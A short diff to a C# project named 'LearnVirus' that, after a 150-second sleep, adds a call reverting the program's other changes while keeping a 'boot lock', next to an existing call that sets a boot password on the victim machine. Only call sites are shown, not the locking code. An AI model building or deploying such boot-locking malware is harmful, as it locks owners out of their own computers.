@@ -23,6 +23,7 @@ namespace LearnVirus
 
             Thread.Sleep(150000);
 
+            Virus.Virus.Reset(); //Revert everything except for boot lock
             Virus.Lock.LockLogin(); //Add boot password
         }
 
